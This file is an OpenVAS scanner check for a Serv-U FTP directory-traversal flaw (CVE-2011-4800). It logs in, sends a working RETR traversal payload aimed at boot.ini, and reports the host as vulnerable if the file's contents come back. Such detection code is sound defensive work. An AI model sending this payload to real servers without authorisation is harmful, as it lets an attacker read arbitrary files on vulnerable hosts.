# OpenVAS Vulnerability Test
# $Id: servu_traversal.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# Serv-U FTP Server Jail Break
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Serv-U FTP is prone to a directory-traversal vulnerability because the
application fails to sufficiently sanitize user-supplied input.

Exploiting this issue allows an attacker to read arbitrary files from locations
outside of the application's current directory. This could help the attacker
launch further attacks.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103354");
 script_version ("$Revision: 9351 $");
 script_bugtraq_id(50875);
 script_cve_id("CVE-2011-4800");
 script_tag(name:"cvss_base", value:"9.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:C/I:C/A:C");

 script_name("Serv-U FTP Server Jail Break");


 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2011-12-02 11:28:44 +0100 (Fri, 02 Dec 2011)");
 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("FTP");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("gb_rhinosoft_serv-u_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://secunia.com/advisories/47021");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/50875");
 script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/71583");
 script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18182");
 script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/fulldisclosure/2011-11/0454.html");
 exit(0);
}

include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port){
  port = 21;
}

if(get_kb_item('ftp/'+port+'/broken'))exit(0);

if(!get_port_state(port)){
  exit(0);
}

if(!version = get_kb_item(string("ftp/", port, "/Serv-U"))) {
 if(!version = get_kb_item(string("Serv-U/FTP/Ver"))) {
  exit(0);
 }
}

banner = get_ftp_banner(port:port);
if("Serv-U" >!< banner)exit(0);

soc1 = open_sock_tcp(port);
if(!soc1){
  exit(0);
}

user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");

if(!user)user = "Anonymous";
if(!pass)pass = "openvas";

login_details = ftp_log_in(socket:soc1, user:user, pass:pass);

if(login_details)
{
  ftpPort2 = ftp_get_pasv_port(socket:soc1);
  if(ftpPort2)
  {
    soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(port));
    if(soc2) {
      send(socket:soc1, data:string("RETR ..:\\:..\\..:\\..:\\..:\\..:\\..:\\..:\\..:\\boot.ini", "\r\n"));
      attackres = ftp_recv_data(socket:soc2);
      close(soc2);
    }
  }

   if(attackres && egrep(pattern:"\[boot loader\]" , string: attackres)) {
     security_message(port:port);
     ftp_close(socket:soc1);
     close(soc1);
     exit(0);
  }

 ftp_close(socket:soc1);
 close(soc1);
 exit(0);

}

exit(0);
